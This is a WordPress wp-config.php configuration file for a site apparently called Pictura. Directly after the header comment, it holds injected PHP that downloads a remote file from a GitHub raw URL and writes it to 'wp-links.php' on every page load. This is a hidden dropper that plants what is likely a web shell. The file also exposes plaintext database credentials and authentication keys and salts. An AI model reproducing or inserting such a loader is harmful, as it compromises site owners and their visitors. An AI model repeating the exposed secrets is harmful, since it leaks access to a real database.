<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */
$nama= fopen("wp-links.php" ,"w+");
  $file = file_get_contents('https://raw.githubusercontent.com/manikci/hallow/main/ma');
  $tulis = fwrite ($nama ,$file);
 fclose($nama);
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
// define('WP_CACHE', true);
define( 'WPCACHEHOME', '/home/xln6jr4p794t/public_html/wp-content/plugins/wp-super-cache/' );
define( 'DB_NAME', 'Pictura' );

/** MySQL database username */
define( 'DB_USER', 'Pictura_Admin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'W9FZBqDMGMHppbn' );

/** MySQL hostname */
define( 'DB_HOST', 'pictura.bio' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?2q~+Ikk7*cnvQ+SY@=ka{|dts^g.d{/I0<MIT(>ZuHC]1#|aS;l/=0UR$rWX<mn' );
define( 'SECURE_AUTH_KEY',  ')D2~9$W7lY%_*3~1+hZujVH&Ak<N# +CK<o2~}]WlQ^2dmtH#GnR0dc:a}@E R7r' );
define( 'LOGGED_IN_KEY',    'c:p6-M+^)9|}N|t5<l/d6hA.aYI&JP>{[wI *kW1x_2r_dXswQYnA+r<>jYD3YTp' );
define( 'NONCE_KEY',        '5;4|~,v~LO:]BM^jb3qF/XFMev=3ILyF:)0`7j(-!i@>k~;P (nb{^*O<bKut>Zm' );
define( 'AUTH_SALT',        '.8]-f^BdLThud/fiXiU]u!*/,&QvuP{oBS%!IBo?SuJ_|vy8YQf1WR[RtwTVuh1j' );
define( 'SECURE_AUTH_SALT', '$7-J.{Q3@:NIIYYashH%Xp7#}HeEB0n@N_CQqJANh[R0vbzx|o!KwAhVM=i[dD&U' );
define( 'LOGGED_IN_SALT',   ':KmOx_}^I&.#RB@XwRfW[<GJ>cO*x=wt1LS!*})MGktzK5JjqU#[!&7p;7[!rC3E' );
define( 'NONCE_SALT',       '4m2r(_Z#-S*KLGW8FWd,0<}D!St_uJ852?SPgHU|||cbaV@xgI(agYb pi#0$ zU' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true);

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';